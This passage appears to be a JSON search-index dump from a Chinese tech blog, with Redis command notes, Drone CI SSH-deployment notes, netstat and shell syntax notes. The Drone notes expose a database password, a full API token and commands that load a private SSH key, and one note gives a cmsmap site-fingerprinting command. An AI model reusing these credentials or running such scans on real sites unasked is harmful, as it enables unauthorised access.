testStr1\r\n\r\n\t注意：如果key不存在，返回nil\r\n\r\n\t\t如果key不是字符串，会报错\r\n\r\n\t3》GETRANGE:返回字符串中一部分\r\n\r\n\t语法：GETRANGE key start end\r\n\r\n\tGETRANGE testStr2 0 4\r\n\r\n\tGETRANGE testStr2 0 -3\r\n\r\n\tGETRANGE testStr2 -4 -2\r\n\r\n\tGETRANGE testStr2 0 1000\r\n\r\n\t4》GETSET:设置指定key的值，并且返回旧的值\r\n\r\n\t语法：GETSET key value\r\n\r\n\tSET testStr3 'king'\r\n\r\n\tGET testStr3\r\n\r\n\tGETSET testStr3 'queen'\r\n\r\n\t注意：当key不存在返回nil\r\n\t\t如果key不是字符串，会报错\r\n\r\n\t5》MSET:一次设置多个键值对\r\n\r\n\t语法：MSET key value [key value...]\r\n\r\n\tMSET testStr5 'king' testStr6 'maizi' testStr7 'queen'\r\n\r\n\r\n\t6》MGET:一次得到多个键值\r\n\r\n\t语法：MGET key key\r\n\r\n\tMGET testStr5 testStr6 testStr7\r\n\r\n\tMGET testStr5 testStr6 testStr7 testStr8\r\n\r\n\t7》STRLEN:获取key的字符串长度\r\n\r\n\t语法：STRLEN key\r\n\r\n\tSTRLEN testStr5\r\n\r\n\t注意：对于不存在key获取其长度返回的0\r\n\r\n\t8》SETRANGE:相当于字符串替换的效果\r\n\r\n\t语法：SETRANGE key offset value\r\n\r\n\t注意：如果设置的key原来的字符串长度要比偏移量小，就会以零字节(\\x00)来填充\r\n\r\n\tSET testStr9 'hello king'\r\n\r\n\tSETRANGE testStr9 6 'queen'\r\n\r\n\t对不存在的key使用SETRANGE\r\n\r\n\tEXISTS testStr10\r\n\r\n\tSETRANGE testStr10 5 'king'\r\n\r\n\t9》SETNX:只有key不存在才能设置成功\r\n\r\n\t语法：SETNX key value\r\n\r\n\tEXISTS testStr11\r\n\r\n\tSETNX testStr11 'maizi'\r\n\r\n\tGET testStr11\r\n\r\n\tSETNX testStr11 'maiziedu'\r\n\r\n\tGET testStr11\r\n\r\n\t10》SETEX:设置key并且设置其过期时间\r\n\r\n\t语法：SETEX key seconds value\r\n\r\n\tSETEX expireStr 60 'testExpire'\r\n\r\n\t注意：SETEX是原子性操作，相当于执行了SET key value,又对这个key设置了过期时间EXPIRE key seconds\r\n\r\n\tSET expireStr1 'test1'\r\n\r\n\tEXPIRE expireStr1 10\r\n\r\n\tSETEX test12 1000 'a'\r\n\r\n\tGET test12\r\n\r\n\t11》MSETNX:一次设置多个key-value对，只有所有的key都不存在的时候才会成功\r\n\r\n\t语法：MSETNX key value [key value]\r\n\r\n\tMSETNX test13 'a' test14 'b' test15 'c'\r\n\r\n\tMSETNX test15 'aa' test16 'bb' test17 'cc'\r\n\r\n\t12》PSETEX:以毫秒为单位设置key的生存周期\r\n\r\n\t语法：PSETEX key milliseconds value\r\n\r\n\tPSETEX test16 2000 'hello world'\r\n\r\n\tPTTL\r\n\r\n\t13》INCR:对key中存储的数字+1\r\n\r\n\t语法：INCR key\r\n\r\n\tSET counter 1\r\n\r\n\tINCR counter\r\n\r\n\t注意：key如果不存在，则会先初始化为0，在进行INCR操作\r\n\r\n\t\t如果key存储的不是数字，会报错\r\n\r\n\tINCR counter1\r\n\r\n\tINCR test20\r\n\r\n\t14》INCRBY:将key中存储的数字加上指定增量\r\n\r\n\t语法：INCRBY key INCREMENT\r\n\r\n\tSET counter2 10\r\n\r\n\tINCRBY counter2 5\r\n\r\n\tINCRBY counter2 1.2\r\n\r\n\t15》INCRBYFLOAT:给key中存储的数字加上指定的浮点数\r\n\r\n\t语法：INCRBYFLOAT key increment\r\n\r\n\tSET counter3 1\r\n\r\n\tINCRBYFLOAT counter3 1.2\r\n\r\n\r\n\t16》DECR:将key中存储的数字减1\r\n\r\n\t语法：DECR key\r\n\r\n\tDECR counter3\r\n\r\n\r\n\t17》DECRBY:将key中存储的数值减去指定的值\r\n\r\n\t语法：DECRBY key decrement\r\n\r\n\tDECRBY counter2 3\r\n\r\n\t18》APPEND:通过APPEND将值追加到字符串的末尾\r\n\r\n\t语法：APPEND key value\r\n\r\n\t注意：如果key不存在，则相当于执行的SET操作\r\n\r\n\r\n\tAPPEND testStr11 'edu'\r\n\r\n\tAPPEND noExistsStr 'this is a test'\r\n\r\nHash类型\r\n\t在配置文件中可以通过配置\r\n\thash-max-ziplist-entries 512 512字节\r\n\thash-max-ziplist-value 64 字段数目\r\n\r\n\tHash相关命令\r\n\r\n\t1》HSET:将哈希表key中域field设置成指定的value\r\n\r\n\t语法：HSET key field value\r\n\r\n\tHSET userInfo1 username 'king'\r\n\r\n\tHSET userInfo1 password '123456'\r\n\r\n\tHSET userInfo1 email '382771946@qq.com'\r\n\r\n\tHGET userInfo1 username\r\n\r\n\tHSET userInfo1 username 'queen'\r\n\r\n\t如果哈希表key中field不存在，相当于新建field，设置成功返回1\r\n\r\n\t如果哈希表key中field存在，相当于重新赋值，成功返回0\r\n\r\n\t2》HGET:返回哈希表key中给定field的值\r\n\r\n\t语法：HGET key field\r\n\r\n\tHGET userInfo1 username\r\n\r\n\t注意：如果key中field不存在，返回的是nil\r\n\r\n\t3》HSETNX:将hash表中的field设置成指定的值，只要field不存在的时候才可以成功；如果field存在，操作无效\r\n\r\n\t语法：HSETNX key field value\r\n\r\n\tHSETNX testHash1 test 'a'\r\n\r\n\t4》HMSET:通过将多个field-value设置到hash表key中\r\n\r\n\t语法：HMSET key field value field value ...\r\n\r\n\tHMSET userInfo2 username 'king' password '123' kickname 'smart king' email '382771946@qq.com'\r\n\r\n\tHGET userInfo2 username\r\n\r\n\tHMSET userInfo2 username 'queen' role 'admin'\r\n\r\n\t5》HMGET:一次获得hash表key中多个field的值\r\n\r\n\t语法：HMGET key field field\r\n\r\n\t注意：如果hash表key中field不存在，会返回nil\r\n\r\n\t6》HGETALL：返回hash表key中所有的field和value\r\n\r\n\t语法：HGETALL key\r\n\r\n\tHGETALL userInfo2\r\n\r\n\t7》HKEYS:返回hash中key的所有的field\r\n\r\n\t语法：HKEYS key\r\n\r\n\tHKEYS userInfo2\r\n\r\n\t8》HVALS:返回hash中key中field所有的对应的值\r\n\r\n\t语法：HVALS key\r\n\r\n\tHVALS userInfo2\r\n\r\n\t9》HEXISTS:检测hash中key的field是否存在\r\n\r\n\t语法：HEXISTS key field\r\n\r\n\tHEXISTS userInfo2 username\r\n\r\n\tHEXISTS userInfo2 notExists\r\n\r\n\t10》HLEN:返回hash表key中field的数量\r\n\r\n\t语法：HLEN key\r\n\r\n\tHLEN userInfo2\r\n\r\n\t11》HINCRBY：给hash中key的field做增量操作\r\n\r\n\t语法：HINCRBY key field increment\r\n\r\n\tHSET userInfo3 age 12\r\n\r\n\tHINCRBY userInfo3 age 10\r\n\r\n\tHSET userInfo3 username 'king'\r\n\r\n\tHINCRBY userInfo3 username 10\r\n\r\n\t12》HINCRBYFLOAT:给hash中key的field做增量浮点操作\r\n\r\n\t语法：HINCRBYFLOAT key field increment\r\n\r\n\tHSET userInfo3 salary '123.111'\r\n\r\n\tHINCRBYFLOAT userInfo3 salary 12.888\r\n\r\n\t13》HDEL:删除hash中key的指定域，可以删除一个也可以删除多个\r\n\r\n\t语法：HDEL key field field\r\n\r\n\tHGETALL userInfo2\r\n\r\n\tHDEL userInfo2 username password email\r\n\r\nList类型\r\n\r\nSet集合类型\r\n\r\nZset有序集合类型\r\n\r\nkeys相关的命令：\r\n\r\n1》KEYS:返回所有符合给定模式的key\r\n\r\n语法：KEYS pattern\r\n\r\n：匹配任意个字符\r\n\r\n?:匹配一个任意字符\r\n\r\n[]:匹配[]之间的一个字符，[b-e],a[b-e] ab ac ad ae\r\n\r\n\\x:匹配特殊字符\\? \\\r\n\r\nMSET one 1 two 2 three 3 four 4 five 5 six 6 seven 7\r\n\r\nKEYS \r\n\r\nKEYS o\r\n\r\nKEYS t??\r\n\r\nKEYS ?o\r\n\r\nKEYS c[n-z]\r\n\r\n2》EXISTS：检测指定key是否存在\r\n\r\n语法：EXISTS key\r\n\r\nEXISTS one\r\n\r\n3》TYPE:返回key所存储的类型\r\n\r\n语法：TYPE key\r\n\r\n不存在的key 返回none\r\nstring\r\nhash\r\nset\r\nzset\r\nlist\r\n\r\nTYPE testStr11\r\n\r\nTYPE userInfo2\r\n\r\n4》EXPIRE：设置key的过期时间\r\n\r\n语法：EXPIRE key seconds\r\n\r\nSET cachepage 'http://phpfamily.org'\r\n\r\nEXPIRE cachepage 100\r\n\r\n注意：如果key已经存在过期时间，在通过EXPIRE设置的时候会覆盖之前过期时间\r\n\r\n5》EXPIREAT:需要指定在指定时间戳过期\r\n\r\n语法：EXPIREAT key timestamp\r\n\r\nSET cachepage1 'http://maiziedu.com'\r\n\r\nEXPIREAT cachepage1 1431868810\r\n\r\n6》PEXPIRE:以毫秒的形式指定过期时间\r\n\r\n语法：PEXIRE key milliseconds\r\n\r\nSET cachepage2 'http://maiziedu.com'\r\n\r\nPEXPIRE cachepage2 50000\r\n\r\n7》PEXPIREAT:指定时间戳，单位为毫秒\r\n\r\n语法：PEXPIREAT key timestamp\r\n\r\nSET cachepage3 'http://phpfamily.org'\r\n\r\nPEXPIREAT cachepage3 1431968810000000\r\n\r\n8》TTL:以秒为单位返回key剩余时间\r\n\r\n语法：TTL key\r\n\r\n注意：如果没有key没有设置过期时间，返回-1\r\n\r\n如果key不存在返回 -2\r\n\r\n返回过期时间\r\n\r\nSET cachepage4 'http://www.baidu.com'\r\n\r\nTTL cachepage4\r\n\r\nTTL cachepage5\r\n\r\nEXPIRE cachepage4 100\r\n\r\nTTL cachepage4\r\n\r\n9》PTTL:以毫秒为单位返回key的剩余时间\r\n\r\n语法：PTTL key\r\n\r\n\r\n10》PERSIST:将一个带有过期时间的key转变成永久的key\r\n\r\n语法：PERSIST key\r\n\r\nSET cache 'testCache'\r\n\r\nEXPIRE cache 100\r\n\r\nTTL cache\r\n\r\nPERSIST cache\r\n\r\nTTL cache\r\n\r\n11》DEL:删除指定的KEY\r\n\r\n语法：DEL key ...\r\n\r\nDEL cache\r\n\r\n12》RANDOMKEY:随机的从当前数据库中返回一个key\r\n\r\n语法：RANDOMKEY\r\n\r\nRANDOMKEY\r\n\r\n13》RENAME:重名名一个键\r\n\r\n语法：RENAME key newkey\r\n\r\nSET testRename1 'rename1'\r\n\r\nRENAME testRename1 testRename2\r\n\r\nRENAME testRename2 testRename2\r\n\r\nRENAME testRename2 test14\r\n\r\nRENAME test14 six\r\n注意：如果名称没有发生改变会报错\r\n\r\n14》RENAMENX：必须重命名这个新名称不存在才会生效\r\n\r\n语法：RENAMENX key newkey\r\n\r\nSET testRename 'test'\r\n\r\nRENAMENX testRename six\r\n\r\n15》DUMP：序列化给定的Key，返回序列化之后的值\r\n\r\n语法：DUMP key\r\n\r\nSET testDump 'this is a test'\r\n\r\nDUMP testDump\r\n\r\n16》RESTORE:反序列化\r\n\r\n语法：RESTORE key tt1 value\r\n\r\nRESTORE testDump1 0 \"\\x00\\x0ethis is a test\\x06\\x00f\\x97\\x10\\x8bo\\xb5\\x91\\xf8\"\r\n\r\nRESTORE testDump3 50000 \"\\x00\\x04test\\x06\\x00\\x17}\\xc7 \\x99\\xa4\\x8c\\xd6\"\r\n\r\n17》MOVE:将当前数据库中的key移动到另外的数据库中\r\n\r\n语法：MOVE key dbId\r\n\r\nSELECT 0\r\nSET testMove 'aaaa'\r\n\r\nMOVE testMove 1\r\n\r\n注意：当移动一个不存在的key会失败\r\n当目录数据库中存在同名key的时候移动失败\r\n\r\nOBJECT、MIGRATE、SCAN、SORT\r\n\r\nList列表类型\r\n\r\n\t1》LPUSH：向列表左端添加元素\r\n\r\n\t语法：LPUSH key value value...\r\n\r\n\tLPUSH myList1 a b c\r\n\r\n\t2》RPUSH:向列表右端添加元素\r\n\r\n\t语法：RPUSH key value ...\r\n\r\n\tRPUSH myList1 test1 test2 test3\r\n\r\n\tRPUSH myList1 test3 test4\r\n\r\n\t3》LPUSHX:向列表头部添加元素，只有key存在在来添加\r\n\r\n\t语法：LPUSHX key value\r\n\r\n\tLPUSHX myList2 a\r\n\r\n\tLPUSH myList2 a\r\n\r\n\tLPUSHX myList2 b\r\n\r\n\t4》RPUSHX:向列表尾部添加元素，只有key存在在来添加\r\n\r\n\t语法：RPUSHX key value\r\n\r\n\t5》LPOP：将列表头部的元素弹出\r\n\r\n\t语法：LPOP key\r\n\r\n\tLPOP myList1\r\n\r\n\t6》RPOP；弹出列表尾部的元素\r\n\r\n\t语法：RPOP key\r\n\r\n\tRPOP myList1\r\n\r\n\t7》LLEN:得到列表的长度\r\n\r\n\t语法：LLEN key\r\n\r\n\tLLEN myList2\r\n\r\n\t8》LRANGE：获取列表片段\r\n\r\n\t语法：LRANGE key start stop\r\n\r\n\tLRANGE myList1 0 -1\r\n\r\n\t注意：\r\n\t如果start下标比列表的最大下标end大，返回的空列表\r\n\t如果stop比列表长度大，返回到列表的末尾\r\n\r\n\t9》LREM:删除列表中指定的值\r\n\r\n\t语法：LREM key count value\r\n\r\n\tcount值有以下几种：\r\n\r\n\tcount  0:从列表的头开始，向尾部搜索，移除与value相等的元素，移除count个\r\n\r\n\tcount\u003c=:从列表尾部向头搜索，移除与value相等的元素，移除count个\r\n\r\n\tcount=0,移除列表中所有与count相等的值\r\n\r\n\tLPUSH myList2 a b c d a e b c d b e f b g e b\r\n\r\n\tLREM myList2 2 b\r\n\r\n\tLREM myList2 -2 a\r\n\r\n\tLREM myList2 0 e\r\n\r\n\t10》LINDEX:获得指定索引元素的值\r\n\r\n\t语法：LINDEX key index\r\n\r\n\tLINDEX myList2 3\r\n\r\n\tLINDEX myList2 -3\r\n\r\n\r\n\t11》LSET:设置指定索引元素的值\r\n\r\n\t语法：LSET key index value\r\n\r\n\tLSET myList2 0 king\r\n\r\n\t12》LTRIM:只保留列表的片段\r\n\r\n\t语法：LTRIM key start stop\r\n\r\n\tLPUSH myList3 log11 log22 log33 log44 log55\r\n\r\n\tLTRIM myList3 0 1\r\n\r\n\tLPUSH myList4 a b c d e f g\r\n\r\n\tLTRIM myList4 1 -1\r\n\r\n\tLTRIM myList4 1 1000\r\n\r\n\tLTRIM myList4 1000 2000 列表被清空\r\n\r\n\tLTRIM myList4 3000 2000 列表被清空\r\n\r\n\t13》LINSERT：向列表插入元素\r\n\r\n\t语法：LINSERT key BEFORE|AFTER pivot value\r\n\r\n\tLPUSH myList5  a b c d\r\n\r\n\tLINSERT myList5 BEFORE 'b' 'king'\r\n\r\n\tLINSERT myList5 BEFORE bb queen\r\n\r\n\tLINSERT myList5 AFTER d queen\r\n\r\n\tLINSERT myList6 AFTER d queen\r\n\r\n\t14》RPOPLPUSH:将元素从一个列表转到另一个列表\r\n\r\n\t语法：RPOPLPUSH source destination\r\n\r\n\tLPUSH myList6 a b c\r\n\r\n\tLPUSH myList7 x y z\r\n\r\n\tRPOPLPUSH myList6 myList7\r\n\r\n\tLPUSH webLog log1 log2 log3 log4\r\n\r\n\tRPOPLPUSH webLog webLog\r\n\r\n\tRPOPLPUSH webLog1 webLog\r\n\r\n\t15》BLPOP:BLPOP 是LPOP的阻塞版本\r\n\r\n\t语法：BLPOP key [key...] timeout\r\n\r\n\tLPUSH myList9 a b c\r\n\r\n\tLPUSH myList10 d e f\r\n\r\n\tBLPOP myList8 myList9 myList10 0\r\n\r\n\tBLPOP myList 8 0\r\n\r\nset集合类型:无序集合\r\n\r\n1》SADD：向集合中添加元素\r\n\r\n语法：SADD key member [,...]\r\n\r\nSADD web maiziedu.com\r\n\r\nSADD web phpfamily.org jd.com\r\n\r\nSADD web phpfamily.org taobao.com\r\n\r\n2》SMEMBERS:返回指定集合中的元素\r\n\r\n语法：SMEMBERS key\r\n\r\nSMEMBERS web\r\n\r\n3》SISMEMBER:检测member是否是集合中的成员\r\n\r\n语法：SISMEMBER key member\r\n\r\nSISMEMBER web maiziedu.com\r\n\r\n4》SREM:删除集合中的一个或者多个成员\r\n\r\n语法：SREM key member [member...]\r\n\r\nSREM web jd.com\r\n\r\nSREM web taobao.com phpfamily.org\r\n\r\n5》SPOP：删除并返回集合中的随机元素\r\n\r\n语法：SPOP key\r\n\r\nSADD course php java ios android c c++ oc\r\n\r\nSPOP course\r\n\r\n6》SRANDMEMBER:随机返回集合中的元素\r\n\r\n语法：SRANDMEMBER key count\r\n\r\n注意：\r\ncount为正数，而且小于集合中的元素，返回的一个包含随机元素的集合数组；count数大于集合中元素的个数，这时候会返回整个集合\r\ncount为负数，返回一个数组，数组中的成员可能出现重复，数组的长度是count取绝对值\r\n\r\nSRANDMEMBER course\r\n\r\nSRANDMEMBER course 2\r\n\r\nSRANDMEMBER course 50\r\n\r\nSRANDMEMBER course -2\r\n\r\n7》SDIFF：返回集合间的差集\r\n\r\n语法：SDIFF key key ...\r\n\r\nSADD testSet1 a b c d e\r\n\r\nSADD testSet2 b c d e f\r\n\r\nSDIFF testSet1 testSet2\r\n\r\nSDIFF testSet2 testSet1\r\n\r\nSADD testSet3 x y z a\r\n\r\nSDIFF testSet1 testSet2 testSet3\r\n\r\n8》SINTER:返回集合间的交集\r\n\r\n语法：SINTER key key...\r\n\r\nSINTER testSet1 testSet2\r\n\r\nSINTER testSet1 testSet2 testSet3\r\n\r\nSADD testSet3 b\r\n\r\n9》SUNION:返回集合中并集操作\r\n\r\n语法：SUNION key key...\r\n\r\nSUNION testSet1 testSet2\r\n\r\nSUNION testSet1 testSet2 testSet3\r\n\r\n10》SCARD:返回集合中元素个数\r\n\r\n语法：SCARD key\r\n\r\nSCARD testSet1\r\n\r\n11》SDIFFSTORE:将差集结果保存到指定集合中\r\n\r\n语法：SDIFFSTORE destination key key ...\r\n\r\nSDIFFSTORE diffSet testSet1 testSet2\r\n\r\nSADD diffSet f\r\n\r\nSDIFFSTORE diffSet testSet2 testSet1\r\n\r\nSDIFFSTORE diffSet testSet1 testSet2\r\n\r\nSDIFFSTORE testSet1 testSet1 testSet2\r\n\r\n12》SINTERSTORE:将交集的结果保存在指定集合中\r\n\r\n语法：SINTERSTORE destination key key ...\r\n\r\n13》SUNIONSTORE:将并集的结果保存到指定集合中\r\n\r\n语法：SUNIONSTORE destination key key ...\r\n\r\n14》SMOVE:将集合中元素移动另外一个集合中\r\n\r\n语法：SMOVE source destination member\r\n\r\n注意：原子操作\r\n\r\nSMOVE testSet2 testSet1 f\r\n\r\nSADD testSet2 f\r\n\r\nSMOVE testSet2 testSet1 f\r\n\r\nzset(sorted set)有序集合\r\n\r\n1》ZADD：将元素及其分数添加到集合中\r\n\r\n语法：ZADD key score member [score member]\r\n\r\nZADD PHPScore 100 king\r\n\r\nZADD PHPScore 98 queen 98 maizi 80 test 78 test1 85 test2\r\n\r\nZADD PHPScore 60 test2 67 test3 56 test4\r\n\r\nZADD PHPScore +inf maxInt -inf minInx\r\n\r\n2》ZSCORE:获得指定元素的分数\r\n\r\n语法：ZSCORE key member\r\n\r\nZSCORE PHPScore maizi\r\n\r\nZADD PHPScore 12.3 test5\r\n\r\n3》ZRANGE:按照元素分数从小到大的顺序返回指定索引start到stop之间所有元素(包含两端)\r\n\r\n语法：ZRANGE key start stop [WITHSCORES]\r\n\r\nZRANGE PHPScore 0 -1\r\n\r\nZRANGE PHPScore 0 -1 WITHSCORES\r\n\r\nZRANGE PHPScore 0 2 WITHSCORES\r\n\r\nZRANGE PHPScore 0 2000 WITHSCORES\r\n\r\nZRANGE PHPScore 1000 2000 WITHSCORES\r\n\r\nZADD PHPScore 60 test6 60 test7 60 test8 60 test9\r\n\r\n注意：当两个元素的分数相同的时候，Redis在排序按照字典的顺序(0\u003c9","tags":null},{"location":"//blog.pytool.com/Post/Awesome/2016-10-04 Awesome-Awesome","title":"Awesome","text":"https://github.com/sindresorhus/awesome\nhttps://github.com/detailyang/awesome-cheatsheet\n\n    https://github.com/sindresorhus/awesome - above 30k stars\n    https://github.com/bayandin/awesome-awesomeness - above 10k stars\n    https://github.com/oyvindrobertsen/awesome-awesome\n    https://github.com/fleveque/awesome-awesomes\n    https://github.com/erichs/awesome-awesome\n    https://github.com/emijrp/awesome-awesome\nhttps://github.com/jobbole/awesome-sysadmin-cn 系统管理员资源大全中文版\nPython 资源大全中文版\n\nscrapy\n ] [Scrapy多个USER_AGENT切换使用\n ] [Scrapy要用代理ip\n ] [去除已经访问过的url，用bloomfilter;\n\n 安全\nhttps://github.com/enaqx/awesome-pentest.git\n\n开发资源总结\nhttps://github.com/rinetd/awesome-resources\n\n超赞的 Linux 软件\n\nLibHunt - Find The Software You Need","tags":null},{"location":"//blog.pytool.com/Post/drone/2016-10-04 Drone支持SSH","title":"drone支持PHP","text":"加密变量设置3种方式\nPASSWORD 123456                        变量设置\nSSHKEY  ${cat /path/to/.ssh/idrsa}  # 命令返回值\nSSHKEY  @/path/to/.ssh/idrsa        # 文件内容\n\n原理： 将script中的每个语句通过 \u0026\u0026 拼接为一条语句\n多个子项之间用 \u0026\u0026 连接\n每个子项之间不能用 ;\n\n - export DRONECOMMITMESSAGE=${DRONECOMMITMESSAGE}\nTARGET=/docker/tomcat/webapps/${DRONEREPONAME}/ ;\n  echo \"$TARGET\";\n  export DBHOST=mysql;\n  export DBNAME=${DRONEREPONAME};\n  export DBUSER=lybb;\n  export DBPASS=hyc@2017\n  # for f in echo \"$DRONECOMMITMESSAGE\" | sed 's/.upgrade \\(.sql\\)./\\1/' ; do if [ -e $TARGET/$f  ]; then echo $f; fi; done\n- sed -i \"s|^jdbc.url=jdbc:mysql.|jdbc.url=jdbc:mysql://mysql:3306/${DRONEREPONAME}?useUnicode=true\\\u0026characterEncoding=UTF-8|g\"  $TARGET/WEB-INF/classes/jeesite.properties\n - sed -i \"s|^jdbc.username=.|jdbc.username=$DBUSER|g\" $TARGET/WEB-INF/classes/jeesite.properties\n- sed -i \"s|^jdbc.password=.|jdbc.password=${DBPASS}|g\" ${TARGET}/WEB-INF/classes/jeesite.properties\nPORT=10000 ; docker rm -f tomcat ; docker run --restart=always -d --name tomcat -p $PORT:8080 --link mariadb:mysql -v /docker/tomcat/webapps/:/usr/local/tomcat/webapps/ -v /docker/tomcat/logs:/usr/local/tomcat/logs  rinetd/tomcat:8.5\n 这里脚本是在远程机器/root目录上执行\n\ndrone 0.6\nName:   \"ssh-key\",\nUsage:  \"private ssh key\",\nEnvVar: \"PLUGINSSHKEY,PLUGINKEY,SSHKEY\n\nssh-key 自动转换为PLUGINSSHKEY 此外又重新定义了PLUGINKEY,SSHKEY与PLUGINSSHKEY等价\n\nssh:\n  image: appleboy/drone-ssh\n  host: demo.linyibr.com\n   username: root\n  # password: ${SSHPASSWORD}\n  # ssh-key: ${SSHKEY}\n  port: 222\n  script:\n    echo $SSHPASSWORD\n    echo ${SSHPASSWORD}\n    echo $${SSHPASSWORD}\n  secrets: [ sshpassword,SSHKEY ]\ndrone secret add --repository linyibr/zhongzhenghuijin --image=appleboy/drone-ssh --name SSHKEY --value @/home/ubuntu/.ssh/idrsa\n\n drone 0.5\ndrone-plugins/drone-ssh: Drone plugin for executing remote ssh commands\n\nThe following parameters are used to configure the plugin:\n\n    host - address or IP of the remote machine\n    port - port to connect to on the remote machine\n    user - user to log in as on the remote machine\n    key - private SSH key for the remote machine\n    sleep - sleep for seconds between host connections\n    timeout - timeout for the tcp connection attempt\n    script - list of commands to execute\n\nThe following secret values can be set to configure the plugin.\n\n    SSHHOST - corresponds to host\n    SSHPORT - corresponds to port\n    SSHUSER - corresponds to user\n    SSHKEY - corresponds to key\n    SSHSLEEP - corresponds to sleep\n    SSHTIMEOUT - corresponds to timeout\n\nssh:\n  image: plugins/ssh\n  host: [ qubuluo.com ]\n  user: root\n  port: 22\n  sleep: 5\n  script:\n    echo hello   word.txt\n    echo world\n每次修改.drone.yml 需要重新签名\n\ndrone secrets add  --image=busybox --image=busybox:* octocat/hello-world SSHKEY @/path/to/.ssh/idrsa\n\nexport DRONESERVER=http://kbook.org\nexport DRONETOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZXh0IjoicmluZXRkIiwidHlwZSI6InVzZXIifQ.0ZFhdVjrBHert1yuWBk3QFO9sKVm4iPzjTkr1l024c8\ndrone secret add --image=plugins/ssh rinetd/drone-with-go SSHKEY @/home/ubuntu/.ssh/idrsa\ndrone sign rinetd/drone-with-go\n\nhttps://github.com/appleboy/drone-ssh/blob/master/main.go\n\nUse the SSH plugin to execute commands on a remote server. The below pipeline configuration demonstrates simple usage:\n\npipeline:\n  ssh:\n    image: appleboy/drone-ssh\n    host: foo.com\n    username: root\n    password: 1234\n    port: 22\n    script:\n      echo hello\n      echo world\n\nExample configuration in your .drone.yml file for multiple hosts:\n\npipeline:\n  ssh:\n    image: appleboy/drone-ssh\n    host:\n- foo.com\n- bar.com\n    username: root\n    password: 1234\n    port: 22\n    script:\n      echo hello\n      echo world\n\nExample configuration for login with user private key:\n\npipeline:\n  ssh:\n    image: appleboy/drone-ssh\n    host: foo.com\n    username: root\npassword: 1234\nkey: ${DEPLOYKEY}\n    port: 22\n    script:\n      echo hello\n      echo world\n\nExample configuration for login with file path of user private key:\n\npipeline:\n  ssh:\n    image: appleboy/drone-ssh\n    host: foo.com\n    username: root\npassword: 1234\nkeypath: ./deploy/key.pem\n    port: 22\n    script:\n      echo hello\n      echo world\n\nExample configuration for command timeout (unit: second), default value is 60 seconds:\n\npipeline:\n  ssh:\n    image: appleboy/drone-ssh\n    host: foo.com\n    username: root\n    password: 1234\n    port: 22\ncommandtimeout: 10\n    script:\n      echo hello\n      echo world\n\nExample configuration for execute commands on a remote server using ｀SSHProxyCommand｀:\n\npipeline:\n  ssh:\n    image: appleboy/drone-ssh\n    host: foo.com\n    username: root\n    port: 22\n    key: ${DEPLOYKEY}\n    script:\n      echo hello\n      echo world\nproxyhost: 10.130.33.145\nproxyuser: ubuntu\nproxyport: 22\nproxykey: ${PROXYKEY}\n\nExample configuration for success build:\n\npipeline:\n  ssh:\n    image: appleboy/drone-ssh\n    host: foo.com\n    username: root\n    password: 1234\n    port: 22\n    script:\n      echo hello\n      echo world\nwhen:\nstatus: success\n\nExample configuration for tag event:\n\npipeline:\n  ssh:\n    image: appleboy/drone-ssh\n    host: foo.com\n    username: root\n    password: 1234\n    port: 22\n    script:\n      echo hello\n      echo world\nwhen:\nstatus: success\nevent: tag\n\nParameter Reference\n\nhost\n    target hostname or IP\nport\n    ssh port of target host\nusername\n    account for target host user\npassword\n    password for target host user\nkey\n    plain text of user private key\nkeypath\n    key path of user private key\nscript\n    execute commands on a remote server\ntimeout\n    Timeout is the maximum amount of time for the TCP connection to establish.\ncommandtimeout\n    Command timeout is the maximum amount of time for the execute commands, default is 60 secs.\nproxyhost\n    proxy hostname or IP\nproxyport\n    ssh port of proxy host\nproxyusername\n    account for proxy host user\nproxypassword\n    password for proxy host user\nproxykey\n    plain text of proxy private key\nproxykey_path\n    key path of proxy private key","tags":null},{"location":"//blog.pytool.com/Hacker/01_信息搜集/2017-06-29 CMS检测","title":"CMS检测","text":"https://github.com/Dionach/CMSmap\n cmsmap.py -t https://example.com\n\n手工检测Web应用指纹的一些技巧","tags":null},{"location":"//blog.pytool.com/Other/2015-01-29 Netstat 中 Recv-Q和Send-Q状态","title":"Netstat 中 Recv-Q和Send-Q状态","text":"实时监控网络状态：\n\nwatch -n 1 netstat -ant \n\n执行命令查看当前网络状态时候发现,执行了命令 netstat -anp\n\nb1发现recv-q 和 send-q 状态不是很正常，对这2个参数不了解，特意学习了一下，简单总结如下：\n\nrecv-Q 表示网络接收队列\n表示收到的数据已经在本地接收缓冲，但是还有多少没有被进程取走，recv()\n如果接收队列Recv-Q一直处于阻塞状态，可能是遭受了拒绝服务 denial-of-service 攻击。\n\nsend-Q 表示网路发送队列\n对方没有收到的数据或者说没有Ack的,还是本地缓冲区.\n如果发送队列Send-Q不能很快的清零，可能是有应用向外发送数据包过快，或者是对方接收数据包不够快。\n\n这两个值通常应该为0，如果不为0可能是有问题的。packets在两个队列里都不应该有堆积状态。可接受短暂的非0情况。\n\n从图中可以看到是大量的 send-Q ,可以判定是发送数据给目的地址的时候出现了阻塞的问题，导致了包堆积在本地缓存中，不能成功发出去。那么问题就产生在了客户端，根据公司的业务逻辑发现是客户端发送的TCP长连接数量过多。验证办法，尝试减少客户端和服务的长连接.查看效果","tags":null},{"location":"//blog.pytool.com/Edit/2015-11-09-editor-vim-notes","title":"","text":"---\ntitle: vim使用笔记\nupdate: 2016-01-01\nlayout: post","tags":null},{"location":"//blog.pytool.com/Post/shell/2017-11-07 shell条件判断","title":"shell条件判断","text":"整数比较\n-eq 等于      if [ \"$a\" -eq \"$b\" ]\n-ne 不等于    if [ \"$a\" -ne \"$b\" ]\n-gt 大于      if [ \"$a\" -gt \"$b\" ]\n-ge 大于等于  if [ \"$a\" -ge \"$b\" ]\n-lt 小于     if [ \"$a\" -lt \"$b\" ]\n-le 小于等于  if [ \"$a\" -le \"$b\" ]\n\u003c 小于（使用 双圆括号）((\"$a\" \u003c \"$b\"))\n\u003c= 小于等于（使用双圆括号）((\"$a\" \u003c= \"$b\"))\n  大于（使用双圆括号）((\"$a\"   \"$b\"))\n  = 大于等于（使用双圆括号） ((\"$a\"   = \"$b\"))\n\n 字符串比较\n= 等于  if [ \"$a\" = \"$b\" ] 注意: 在=前后要加上空格\n       if [ \"$a\"=\"$b\" ] 和上面不等价。\n == 等于 if [ \"$a\" == \"$b\" ] 和 = 同义\n   note == 操作符在 双方括号 和单方括号里的功能是不同的。\n\n[[ $a == z ]]   # $a 以 \"z\" 开头时为真（模式匹配）\n[[ $a == \"z\" ]] # $a 等于 z 时为真（字符匹配）\n\n[ $a == z ]     # 发生文件匹配和字符分割。\n[ \"$a\" == \"z\" ] # $a 等于 z 